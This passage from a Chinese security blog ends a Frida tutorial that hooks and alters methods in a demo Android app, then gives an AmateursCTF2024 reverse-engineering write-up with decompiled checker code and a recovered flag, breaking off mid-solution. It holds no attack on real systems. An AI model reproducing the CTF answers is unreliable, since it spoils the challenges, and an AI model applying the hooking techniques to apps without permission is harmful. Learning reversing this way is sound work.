<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.whathappened.MyJNI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myjni</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;whathappened&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">getstr</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line">    String <span class="title function_">func</span><span class="params">(String x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getstr</code>是一个JNI注册的native函数 没有参数只有返回值 可以使用这个脚本来hook结果:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(        <span class="comment">//hook脚本要执行的函数</span></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.whathappened.MyJNI.Myjni&quot;</span>);    <span class="comment">//找到目标类并重载到指定的变量中</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Myjni</span>.<span class="title function_">getstr</span>();        <span class="comment">//主动调用并获取这个类中的getstr函数执行的结果</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>对func函数如果想打印参数和结果的话需要区分重载:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.whathappened.MyJNI.Myjni&quot;</span>);</span><br><span class="line">        <span class="title class_">Myjni</span>.<span class="property">func</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x, y</span>)&#123;    <span class="comment">//明确重载类型</span></span><br><span class="line">            <span class="keyword">var</span> origin_res = <span class="variable language_">this</span>.<span class="title function_">func</span>(x, y);    <span class="comment">//调用原函数</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Origin call:func(&quot;</span> + x + <span class="string">&quot;, &quot;</span> + y + <span class="string">&quot;) -&gt;&quot;</span> + origin_res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Myjni</span>.<span class="property">func</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">s</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> newres = s.<span class="title function_">toUpperCase</span>();        <span class="comment">//修改原函数的功能</span></span><br><span class="line">            <span class="keyword">return</span> newres;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>因为刚学所以只有基础知识 以后有新东西再放上来</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Android</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>AmateursCTF2024逆向方向wp</title>
    <url>/2024/04/15/AmateursCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT, Team : 4W3, 最终排名:88th(公开赛道)</p>
<p>email:<a href="mailto:&#111;&#107;&#117;&#117;&#x73;&#117;&#x6b;&#117;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#111;&#107;&#117;&#117;&#x73;&#117;&#x6b;&#117;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a></p>
<p>做到flocto师傅的题真的每次都要有感而发一下 真正能让我全身心投入的赛题 给一个陌生的考点 但是不至于让你寸步难行 有种接触新东西的时候那个东西对你欲拒还迎激发探索欲的美 可能这就是flocto师傅出的题的魅力吧</p>
<span id="more"></span>

<h2 id="revtale-1-GM逆向"><a href="#revtale-1-GM逆向" class="headerlink" title="revtale-1 | GM逆向"></a>revtale-1 | GM逆向</h2><p>和LACTF那次不同的是这次就是纯粹的套GM壳检测flag而不是游戏逆向 没有魔改data文件 直接用<code>UndertaleModTool</code>看代码即可:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pk = [<span class="number">95</span>, <span class="number">119</span>, <span class="number">51</span>]</span><br><span class="line"><span class="built_in">draw_set_font</span>(font_det)</span><br><span class="line"><span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; <span class="built_in">array_length</span>(char_grid); i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (var j = <span class="number">0</span>; j &lt; <span class="built_in">array_length</span>(char_grid[i]); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        jitter_x = <span class="built_in">random_range</span>(<span class="number">-2</span>, <span class="number">2</span>)</span><br><span class="line">        jitter_y = <span class="built_in">random_range</span>(<span class="number">-2</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> ((cc == j) &amp;&amp; (rc == i) &amp;&amp; (!solv))</span><br><span class="line">            <span class="built_in">draw_set_color</span>(c_yellow)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">draw_set_color</span>(c_white)</span><br><span class="line">        <span class="built_in">draw_text_transformed</span>(((<span class="number">128</span> + (j * <span class="number">64</span>)) + jitter_x), ((<span class="number">100</span> + (i * <span class="number">32</span>)) + jitter_y), char_grid[i][j], <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ch = char_grid[rc][cc]</span><br><span class="line"><span class="keyword">if</span> ((ch == <span class="string">&quot;&#125;&quot;</span>) &amp;&amp; (!solv))</span><br><span class="line">    <span class="built_in">draw_set_color</span>(c_yellow)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">draw_set_color</span>(c_white)</span><br><span class="line"><span class="keyword">if</span> ((cnt &gt; <span class="number">75</span>))</span><br><span class="line">    <span class="built_in">draw_text_transformed</span>((<span class="number">320</span> - ((<span class="number">2</span> * <span class="built_in">string_width</span>(s)) / <span class="number">2</span>)), <span class="number">20</span>, s, (<span class="number">2</span> + scl_modif), (<span class="number">2</span> + scl_modif), <span class="number">0</span>)</span><br><span class="line">old = <span class="string">&quot;amateursCTF&#123;fak3_flag_w1dth_t3st&#125;&quot;</span></span><br><span class="line"><span class="built_in">draw_text_transformed</span>((<span class="number">320</span> - ((<span class="number">2</span> * <span class="built_in">string_width</span>(<span class="string">&quot;amateursCTF&#123;fak3_flag_w1dth_t3st&#125;&quot;</span>)) / <span class="number">2</span>)), <span class="number">60</span>, current, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">dr = <span class="number">0</span></span><br><span class="line">dc = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(<span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">show_debug_message</span>(ch)</span><br><span class="line">    <span class="keyword">if</span> ((ch != <span class="string">&quot;&lt;&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">string_length</span>(current) &lt; <span class="number">40</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            current += ch</span><br><span class="line">            <span class="keyword">if</span> ((ch == <span class="string">&quot;&#125;&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">scr_check_flag</span>(current)</span><br><span class="line">                &#123;</span><br><span class="line">                    solv = <span class="number">1</span></span><br><span class="line">                    <span class="built_in">audio_play_sound</span>(snd_cymbal, <span class="number">10</span>, <span class="literal">false</span>)</span><br><span class="line">                    <span class="built_in">window_set_caption</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">                    shk += <span class="number">10</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    fails += <span class="number">1</span></span><br><span class="line">                    s = (<span class="string">&quot;incorrect flag attempt #&quot;</span> + <span class="built_in">string</span>(fails))</span><br><span class="line">                    current = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (((fails % <span class="number">10</span>) == <span class="number">0</span>))</span><br><span class="line">                        s = <span class="string">&quot;Stay determined!&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> ((fails &gt; <span class="number">10</span>))</span><br><span class="line">                        shk += <span class="number">120</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ((fails &gt; <span class="number">3</span>))</span><br><span class="line">                        shk += <span class="number">30</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s = <span class="string">&quot;That&#x27;s not the flag!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="built_in">string_length</span>(current) &gt; <span class="number">0</span>))</span><br><span class="line">        current = <span class="built_in">string_delete</span>(current, <span class="built_in">string_length</span>(current), <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_down)</span><br><span class="line">    dr += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_up)</span><br><span class="line">    dr -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_right)</span><br><span class="line">    dc += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_left)</span><br><span class="line">    dc -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> ((dr != <span class="number">0</span>) || (dc != <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    nr = (rc + dr)</span><br><span class="line">    nr = <span class="built_in">clamp</span>(nr, <span class="number">0</span>, (<span class="built_in">array_length</span>(char_grid) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">array_length</span>(char_grid[nr]) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        nr = (rc + (<span class="number">2</span> * dr))</span><br><span class="line">        nr = <span class="built_in">clamp</span>(nr, <span class="number">0</span>, (<span class="built_in">array_length</span>(char_grid) - <span class="number">1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    nc = <span class="built_in">clamp</span>((cc + dc), <span class="number">0</span>, (<span class="built_in">array_length</span>(char_grid[nr]) - <span class="number">1</span>))</span><br><span class="line">    rc = nr</span><br><span class="line">    cc = nc</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((scl_modif &gt; <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    v = <span class="built_in">clamp</span>((scl_modif * <span class="number">127.5</span>), <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    <span class="built_in">layer_background_blend</span>(bg_id, <span class="built_in">make_color_rgb</span>(v, v, v))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">funcs = [color_get_hue, color_get_green]</span><br><span class="line">function <span class="built_in">scr_check_flag</span>(argument0) <span class="comment">//gml_Script_scr_check_flag</span></span><br><span class="line">&#123;</span><br><span class="line">    l = <span class="built_in">string_lower</span>(argument0)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">string_pos</span>(<span class="string">&quot;gaster&quot;</span>, l) != <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">window_set_caption</span>(<span class="string">&quot;redacted&quot;</span>)</span><br><span class="line">        <span class="built_in">game_end</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">string_pos</span>(<span class="string">&quot;frisk&quot;</span>, l) != <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">window_set_caption</span>(<span class="string">&quot;don&#x27;t make this hard&quot;</span>)</span><br><span class="line">        <span class="built_in">game_end</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">string_starts_with</span>(argument0, <span class="string">&quot;amateursCTF&#123;&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">string_length</span>(argument0) &gt; <span class="number">15</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            a = <span class="built_in">scr_a</span>(argument0)</span><br><span class="line">            <span class="keyword">if</span> ((a[<span class="number">12</span>] == <span class="string">&quot;&#123;&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">window_set_caption</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">array_length</span>(a); i++)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            aa = (<span class="built_in">ord</span>(a[<span class="number">12</span>]) &amp; <span class="number">4095</span>)</span><br><span class="line">            ab = (<span class="built_in">ord</span>(a[<span class="number">13</span>]) &amp; <span class="number">2047</span>)</span><br><span class="line">            ac = (<span class="built_in">ord</span>(a[<span class="number">14</span>]) &amp; <span class="number">1023</span>)</span><br><span class="line">            ad = (<span class="built_in">ord</span>(a[<span class="number">15</span>]) &amp; <span class="number">511</span>)</span><br><span class="line">            arr_op = array_reverse</span><br><span class="line">            color_check = color_get_saturation</span><br><span class="line">            <span class="keyword">if</span> ((a[<span class="number">12</span>] == a[<span class="number">13</span>]) &amp;&amp; (a[<span class="number">12</span>] != a[<span class="number">14</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((ac == (aa - <span class="number">2</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((ab + <span class="number">152</span>) == self.<span class="built_in">color_check</span>(<span class="number">16711935</span>)) &amp;&amp; ((ad + <span class="number">133</span>) == self.<span class="built_in">color_check</span>(<span class="number">128</span>)))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (((obj_input_field.pk[<span class="number">0</span>] ^ <span class="built_in">ord</span>(a[<span class="number">16</span>])) == <span class="number">0</span>))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (((obj_input_field.pk[<span class="number">1</span>] ^ <span class="built_in">ord</span>(a[<span class="number">17</span>])) == <span class="number">0</span>))</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (((obj_input_field.pk[<span class="number">2</span>] ^ <span class="built_in">ord</span>(a[<span class="number">18</span>])) == <span class="number">0</span>))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((<span class="built_in">ord</span>(a[<span class="number">19</span>]) == (<span class="built_in">power</span>(<span class="number">2</span>, <span class="number">6</span>) | <span class="number">31</span>)))</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        r = self.<span class="built_in">arr_op</span>([<span class="string">&quot;%&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;_&quot;</span>], <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">                                        c = <span class="number">0</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">19</span>] == r[<span class="number">0</span>]))</span><br><span class="line">                                            c += <span class="number">1</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">20</span>] == r[<span class="number">1</span>]))</span><br><span class="line">                                            c += <span class="number">2</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">21</span>] == r[<span class="number">2</span>]))</span><br><span class="line">                                            c += <span class="number">3</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">22</span>] == r[<span class="number">3</span>]))</span><br><span class="line">                                            c += <span class="number">4</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">23</span>] == r[<span class="number">4</span>]))</span><br><span class="line">                                            c += <span class="number">5</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">20</span>] == a[<span class="number">21</span>]))</span><br><span class="line">                                            c += <span class="number">5</span></span><br><span class="line">                                        <span class="keyword">if</span> ((c == <span class="number">15</span>))</span><br><span class="line">                                        &#123;</span><br><span class="line">                                            <span class="keyword">if</span> ((<span class="built_in">string_pos</span>(<span class="built_in">file_text_read_string</span>(<span class="built_in">file_text_open_read</span>(<span class="string">&quot;f.txt&quot;</span>)), argument0) != <span class="number">0</span>))</span><br><span class="line">                                                <span class="built_in">return</span> ((<span class="number">45887</span> == <span class="built_in">scr_c</span>((((<span class="built_in">string_char_at</span>(argument0, <span class="number">29</span>) + <span class="built_in">string_char_at</span>(argument0, <span class="number">30</span>)) + <span class="built_in">string_char_at</span>(argument0, <span class="number">31</span>)) + <span class="built_in">string_char_at</span>(argument0, <span class="number">32</span>)))) &amp;&amp; (<span class="built_in">ord</span>(a[<span class="number">32</span>]) == <span class="number">125</span>));</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">show_message</span>((<span class="string">&quot;flag wrapper missing... you entered &quot;</span> + argument0))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">scr_a</span><span class="params">(argument0)</span> <span class="comment">//gml_Script_scr_a</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    o = []</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">string_length</span>(argument0); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i &gt; <span class="number">0</span>))</span><br><span class="line">            <span class="built_in">array_push</span>(o, <span class="built_in">string_char_at</span>(argument0, i))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">scr_b</span><span class="params">(argument0)</span> <span class="comment">//gml_Script_scr_b</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    alpha = [<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((alpha[k] == argument0))</span><br><span class="line">            <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">scr_c</span><span class="params">(argument0)</span> <span class="comment">//gml_Script_scr_c</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    o = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= <span class="built_in">string_length</span>(argument0); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        o *= <span class="number">16</span></span><br><span class="line">        cr = <span class="built_in">string_char_at</span>(argument0, j)</span><br><span class="line">        d = <span class="built_in">scr_b</span>(cr)</span><br><span class="line">        <span class="built_in">show_debug_message</span>((((((((((<span class="string">&quot;+= &quot;</span> + <span class="built_in">string</span>(d)) + <span class="string">&quot; &quot;</span>) + <span class="built_in">string</span>(j)) + <span class="string">&quot; &quot;</span>) + <span class="built_in">string</span>(<span class="built_in">string_length</span>(argument0))) + <span class="string">&quot; &quot;</span>) + argument0) + <span class="string">&quot; &quot;</span>) + cr))</span><br><span class="line">        <span class="keyword">if</span> ((d == <span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        o += d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对flag进行了分段检测 直接解出每段的flag拼接即可<code>amateursCTF&#123;ggez_w3_l0v3_vm_b33f&#125;</code></p>
<h2 id="cplusplus-代码理解"><a href="#cplusplus-代码理解" class="headerlink" title="cplusplus | 代码理解"></a>cplusplus | 代码理解</h2><p>64位无壳 主函数(已重命名变量和函数):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 num; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> random[<span class="number">2</span>]; <span class="comment">// [rsp+1Eh] [rbp-52h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(input, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(random, <span class="number">1uLL</span>, <span class="number">2uLL</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  num = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; input[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n1 = ilproc(num, input[i]);</span><br><span class="line">    n2 = func0(n1, random[<span class="number">0</span>]);</span><br><span class="line">    num = func1(n2, random[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%zu&quot;</span>, num);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output.txt:</span></span><br><span class="line"><span class="comment">816696039, 862511530, 897431439, 341060728, 173157153, 31974957, 491987052, 513290022, 463763452, 949994705, 910803499, 303483511, 378099927, 773435663, 305463445, 656532801, 655150297, 28357806, 69914739, 213536453, 962912446, 458779691, 598643891, 94970179, 732507398, 792930123, 216371336, 680163935, 397010125, 693248832, 926462193, 419350956, 594922380, 944019434, 93600641, 116339550, 373995190, 558908218, 700841647, 703877327, 665247438, 690373754, 35138387, 389900716, 625740467, 682452898, 894528752, 603308386, 442640217, 15961938, 573068354</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><code>/dev/urandom</code>是Linux系统的一个随机数发生器 程序从里面取了两次1byte数据存入random中 用这两个1byte随机数对flag进行加密 处理函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">add</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 high; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( high = <span class="number">1LL</span>; (high &amp; a1) != <span class="number">0</span>; high *= <span class="number">2LL</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> ( i = high | a1; ; i &amp;= ~high )</span><br><span class="line">  &#123;</span><br><span class="line">    high &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !high )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ilproc</span><span class="params">(<span class="type">unsigned</span> __int64 num1, <span class="type">unsigned</span> __int64 num2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 count; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( count = <span class="number">0LL</span>; count &lt; num2; count = add(count) )</span><br><span class="line">    num1 = add(num1);</span><br><span class="line">  <span class="keyword">return</span> num1 % mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">process</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 num,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 random,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 _1,</span></span><br><span class="line"><span class="params">        __int64 (__fastcall *ilproc)(<span class="type">unsigned</span> __int64, <span class="type">unsigned</span> __int64))</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( random )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (random &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      _1 = ilproc(_1, num) % mod;</span><br><span class="line">    num = ilproc(num, num) % mod;               <span class="comment">// 0x3B9ACA07</span></span><br><span class="line">    random &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">func0</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> process(a1, a2, <span class="number">0LL</span>, ilproc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">func1</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> process(a1, a2, <span class="number">1uLL</span>, func0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较有迷惑性的是<code>add(arg)</code>函数(已重命名) 实际上就是<code>lambda arg:arg + 1</code> 剩下的难点就是找到这两个随机数 好在它们的长度只有1byte 直接爆破即可:</p>
